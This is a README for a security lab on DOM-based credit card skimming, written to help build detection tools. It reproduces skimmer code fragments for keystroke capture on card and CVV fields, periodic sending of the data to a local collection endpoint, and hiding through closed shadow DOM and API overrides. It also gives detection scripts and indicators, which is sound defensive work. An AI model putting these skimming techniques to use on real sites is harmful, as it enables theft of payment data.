# Lab 2: DOM-Based Skimming

This lab demonstrates **DOM-based credit card skimming** attacks that manipulate
the Document Object Model to capture payment data through real-time field
monitoring and dynamic form injection.

## Attack Overview

Unlike traditional form submission interception (Lab 1), DOM-based skimming
attacks operate by:

1. **Real-time field monitoring** using DOM mutation observers
2. **Dynamic element injection** to create fake payment forms
3. **Input event interception** on existing payment fields
4. **DOM tree manipulation** to hide/redirect payment flows
5. **Shadow DOM abuse** for stealth operations

## Key Differences from Lab 1

### Attack Vector Changes

- **Target**: DOM structure and input events vs form submission
- **Timing**: Real-time field monitoring vs post-submission capture
- **Detection**: DOM mutation patterns vs network traffic
- **Stealth**: DOM manipulation vs code injection
- **Persistence**: Event listener attachment vs one-time interception

### Technical Approach

- **MutationObserver API** for DOM change detection
- **Input/change event listeners** for real-time capture
- **Dynamic form creation** and injection
- **Shadow DOM** for hidden attack infrastructure
- **DOM tree traversal** for payment field discovery

## Lab Scenarios

### Scenario 1: Real-Time Field Monitoring

- Monitors payment form fields using input events
- Captures data as user types (keystroke logging)
- Uses MutationObserver to detect new payment forms
- Stealth operation without form submission interference

### Scenario 2: Dynamic Form Overlay

- Injects fake payment form over legitimate checkout
- Uses DOM manipulation to hide real form
- Captures credentials through fake overlay
- Redirects to legitimate flow after capture

### Scenario 3: Shadow DOM Skimming

- Uses Shadow DOM for hidden attack infrastructure
- Attaches event listeners through shadow boundaries
- Maintains persistence across page navigation
- Evades traditional DOM inspection

## ML Training Value

This lab helps detection models learn to identify:

### DOM Manipulation Patterns

- Unexpected element creation/modification
- Shadow DOM usage in payment contexts
- Dynamic event listener attachment
- DOM tree structure anomalies

### Event-Based Monitoring

- Excessive input/change event listeners
- Real-time data capture patterns
- Keystroke logging behaviors
- Field focus/blur tracking

### Stealth Techniques

- Shadow DOM encapsulation abuse
- Dynamic script injection via DOM
- Event listener persistence mechanisms
- DOM-based obfuscation patterns

## Detection Guide for Security Tools

### Attack Variant A: Real-Time DOM Monitoring

**File**: `vulnerable-site/malicious-code/dom-monitor.js`

#### Primary Detection Signatures

##### 1. **MutationObserver Setup** (High Confidence)

**Location**: `dom-monitor.js:lines 150-170`

```javascript
const mutationObserver = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      mutation.addedNodes.forEach(node => {
        if (node.nodeType === Node.ELEMENT_NODE) {
          checkForTargetFields(node)
        }
      })
    }
  })
})

mutationObserver.observe(document.body, {
  childList: true,
  subtree: true,
  attributes: true,
  attributeFilter: ['type', 'name', 'autocomplete']
})
```

**Detection Rule**: MutationObserver with `subtree: true` that queries for payment-related fields on every DOM change.

##### 2. **Real-Time Field Monitoring** (Critical Indicator)

**Location**: `dom-monitor.js:lines 180-220`

```javascript
function attachMonitoring(element) {
  // Keystroke-level capture
  element.addEventListener('input', function(event) {
    capturedData.keystrokes.push({
      field: element.name || element.id,
      value: element.value,
      timestamp: Date.now(),
      key: event.data
    })
  })

  // Track field focus/blur
  element.addEventListener('focus', trackFocus)
  element.addEventListener('blur', trackBlur)

  // Periodic value snapshots
  setInterval(() => {
    if (element.value) {
      capturedData.fields.set(element.name, element.value)
    }
  }, CONFIG.keystrokeInterval)
}
```

**Detection Rules**:
- Input event listeners that log every keystroke
- SetInterval-based value polling on payment fields
- WeakSet tracking to avoid duplicate listeners
- Keystroke interval < 100ms indicates aggressive monitoring

##### 3. **Targeted Field Selection** (Behavioral Pattern)

**Location**: `dom-monitor.js:lines 24-52`

```javascript
const CONFIG = {
  exfilUrl: 'http://localhost:9004/collect',
  targetFields: [
    'input[type="password"]',
    'input[autocomplete*="cc-number"]',
    'input[autocomplete*="cc-exp"]',
    'input[autocomplete*="cc-csc"]',
    'input[name*="card"]',
    'input[id*="cvv"]',
    'input[name*="account"]',
    'input[name*="routing"]'
  ],
  keystrokeInterval: 50,
  reportInterval: 5000
}
```

**Detection Rule**: Large arrays of CSS selectors targeting payment fields with aggressive polling intervals.

##### 4. **Periodic Reporting** (Network Pattern)

**Location**: `dom-monitor.js:lines 250-280`

```javascript
reportTimer = setInterval(() => {
  if (capturedData.keystrokes.length > 0) {
    exfiltrateData({
      type: 'periodic',
      timestamp: Date.now(),
      summary: {
        keystrokesCount: capturedData.keystrokes.length,
        fieldsCount: capturedData.fields.size
      },
      fullData: {
        keystrokes: capturedData.keystrokes,
        fieldValues: Object.fromEntries(capturedData.fields)
      }
    })
  }
}, CONFIG.reportInterval)
```

**Detection Rule**: Regular interval-based network requests (every 5 seconds) containing keystroke data.

### Attack Variant B: Shadow DOM Skimming

**File**: `vulnerable-site/malicious-code/shadow-skimmer.js`

#### Primary Detection Signatures

##### 1. **Closed Shadow DOM Creation** (Stealth Technique)

```javascript
const CONFIG = {
  shadowMode: 'closed',  // Hidden from devtools
  maxShadowDepth: 5,     // Nested structure
  stealthDelay: 1000
}

function createStealthContainer() {
  const container = document.createElement('div')
  container.style.cssText = `
    position: absolute;
    width: 0;
    height: 0;
    overflow: hidden;
    opacity: 0;
    pointer-events: none;
  `

  // Create closed shadow DOM (not inspectable)
  const shadow = container.attachShadow({ mode: 'closed' })
  return { container, shadow }
}
```

**Detection Rules**:
- `attachShadow({ mode: 'closed' })` calls
- Zero-sized elements with shadow roots
- Nested shadow DOM structures (depth > 2)
- Elements with `pointer-events: none` but event listeners

##### 2. **Property Descriptor Overrides** (Anti-Detection)

```javascript
// Override Object.defineProperty to hide shadow roots
const originalDefineProperty = Object.defineProperty
Object.defineProperty = function(obj, prop, descriptor) {
  if (prop === 'shadowRoot') {
    // Hide shadow root property
    return originalDefineProperty(obj, prop, {
      ...descriptor,
      get: () => null
    })
  }
  return originalDefineProperty(obj, prop, descriptor)
}

// Override element.attachShadow for stealth
Element.prototype.attachShadow = new Proxy(Element.prototype.attachShadow, {
  apply(target, thisArg, args) {
    const shadow = Reflect.apply(target, thisArg, args)
    // Track but don't expose
    hiddenShadowRoots.set(thisArg, shadow)
    return shadow
  }
})
```

**Detection Rules**:
- Modifications to `Object.defineProperty`
- Proxying of `Element.prototype.attachShadow`
- Overrides that hide or mask shadow root access
- WeakMap collections of "hidden" elements

##### 3. **Cross-Shadow Boundary Monitoring**

```javascript
function monitorAcrossShadows(root, depth = 0) {
  if (depth > CONFIG.maxShadowDepth) return

  // Monitor within this shadow context
  attachMonitoring(root)

  // Traverse into nested shadows
  root.querySelectorAll('*').forEach(element => {
    if (hiddenShadowRoots.has(element)) {
      const shadow = hiddenShadowRoots.get(element)
      monitorAcrossShadows(shadow, depth + 1)
    }
  })
}
```

**Detection Rule**: Recursive traversal across shadow boundaries with depth > 3.

### Network Traffic Patterns

**DOM Monitor Periodic Reports**:
```
POST http://localhost:9004/collect
Content-Type: application/json

{
  "type": "periodic",
  "timestamp": 1704067800000,
  "summary": {
    "keystrokesCount": 47,
    "fieldsCount": 4
  },
  "fullData": {
    "keystrokes": [
      {"field": "card-number", "value": "4", "timestamp": 1704067795100},
      {"field": "card-number", "value": "45", "timestamp": 1704067795150},
      {"field": "card-number", "value": "453", "timestamp": 1704067795200}
    ],
    "fieldValues": {
      "card-number": "4532-1234-5678-9010",
      "cvv": "123",
      "expiry": "12/25"
    }
  }
}
```

**Detection Indicators**:
- Regular interval-based requests (every 5 seconds)
- Payloads containing keystroke sequences
- Type field: "periodic", "immediate", or "session_end"
- Keystroke timestamps with <100ms intervals

### Browser DevTools Detection

**Detecting DOM-Based Attacks**:

1. **Elements Tab**:
   - Look for zero-sized elements (`width: 0; height: 0`)
   - Search for elements with `opacity: 0` but event listeners
   - Check for `pointer-events: none` elements
   - Inspect shadow roots (Closed shadows won't appear)

2. **Console Detection Script**:
```javascript
// Run this in console to detect monitoring
(function detectMonitoring() {
  const fields = document.querySelectorAll('input[type="password"], input[autocomplete*="cc"]')

  fields.forEach(field => {
    const listeners = getEventListeners(field)

    if (listeners.input?.length > 1 ||
        listeners.change?.length > 1 ||
        listeners.keyup?.length > 0) {
      console.warn('⚠️ Suspicious monitoring detected:', field.name, listeners)
    }
  })

  // Check for MutationObservers
  if (window.MutationObserver.toString() !== 'function MutationObserver() { [native code] }') {
    console.error('🚨 MutationObserver may be tampered!')
  }
})()
```

3. **Network Tab**:
   - Enable "Preserve log"
   - Filter by "collect" or C2 domain
   - Look for periodic POST requests
   - Examine payloads for keystroke data

### Static Analysis Detection

**Grep/ripgrep commands**:

```bash
# Search for MutationObserver patterns
grep -r "MutationObserver.*observe" --include="*.js" .

# Search for aggressive event listeners
grep -r "addEventListener.*input\|addEventListener.*keyup" --include="*.js" .

# Search for shadow DOM usage
grep -r "attachShadow.*closed\|shadowRoot" --include="*.js" .

# Search for polling intervals
grep -r "setInterval.*field\|keystrokeInterval" --include="*.js" .

# Search for property overrides
grep -r "Object.defineProperty\|Proxy.*prototype" --include="*.js" .
```

### Runtime Behavior Detection

**Behavioral indicators**:

1. **Excessive Event Listeners**:
   - More than 2 input listeners per field
   - Keyup listeners on payment fields
   - Focus/blur tracking on sensitive inputs

2. **DOM Mutation Patterns**:
   - MutationObserver watching entire document
   - Attribute monitoring for type/name/autocomplete changes
   - Callback execution frequency > 10/second

3. **Shadow DOM Anomalies**:
   - Closed shadow roots on forms
   - Nested shadows depth > 2
   - Zero-sized shadow containers
   - Hidden elements with event listeners

4. **Network Activity**:
   - Periodic POST requests (5-10 second intervals)
   - Requests containing keystroke arrays
   - Payloads with incremental field values
   - Type field indicating monitoring phase

## Detection Signatures Summary

### DOM API Abuse

```javascript
// MutationObserver for payment form detection
new MutationObserver(callback).observe(document, {
  childList: true,
  subtree: true,
  attributes: true
})

// Shadow DOM creation for stealth
element.attachShadow({ mode: 'closed' })

// Dynamic element injection
document.createElement('form')
element.innerHTML = maliciousForm
```

### Event Listener Patterns

```javascript
// Real-time field monitoring
element.addEventListener('input', captureData)
element.addEventListener('change', captureData)
element.addEventListener('keyup', captureData)

// Payment-specific targeting
document.querySelectorAll('[type="password"], [autocomplete*="cc"]')
```

### DOM Traversal Signatures

```javascript
// Payment field discovery
document.querySelectorAll('[name*="card"], [id*="credit"]')
document.querySelector('[data-payment], [class*="payment"]')

// Form overlay injection
parentElement.insertBefore(fakeForm, realForm)
realForm.style.display = 'none'
```

## File Structure

```
02-dom-skimming/
├── vulnerable-site/           # Target banking/payment website
│   ├── banking.html          # Main banking interface
│   ├── malicious-code/       # Attack implementations
│   │   ├── dom-monitor.js    # Real-time field monitoring
│   │   ├── form-overlay.js   # Dynamic form injection
│   │   └── shadow-skimmer.js # Shadow DOM attack
│   ├── js/
│   │   └── banking.js        # Legitimate banking code
│   ├── css/
│   │   └── banking.css       # Banking interface styles
│   └── images/               # Banking UI assets
├── c2-server/                # C2 server for data exfiltration
│   ├── server.js             # C2 server implementation
│   └── dashboard.html        # C2 dashboard
└── test/                     # Playwright test suite
    └── tests/
        ├── dom-monitor.spec.js
        ├── form-overlay.spec.js
        └── shadow-skimmer.spec.js
```

## Usage

1. **Start the vulnerable site**: Serves banking/payment interface
2. **Deploy attack code**: Inject DOM skimming malware
3. **Monitor DOM changes**: Watch for real-time data capture
4. **Analyze behavior**: Study DOM manipulation patterns
5. **Run detection tests**: Validate ML model performance

## Educational Objectives

### Understanding DOM-Based Attacks

- Learn how attackers manipulate page structure
- Understand real-time data capture techniques
- Explore Shadow DOM abuse for stealth operations
- Analyze event-driven attack methodologies

### Detection Development

- Develop DOM mutation monitoring systems
- Create event listener analysis tools
- Build Shadow DOM inspection capabilities
- Train models on DOM manipulation patterns

### Defense Strategies

- Implement DOM integrity monitoring
- Deploy Content Security Policy (CSP) restrictions
- Use Subresource Integrity (SRI) for DOM protection
- Monitor for suspicious event listener patterns

This lab provides comprehensive training data for detecting modern DOM-based
skimming attacks that operate through page structure manipulation rather than
traditional code injection.
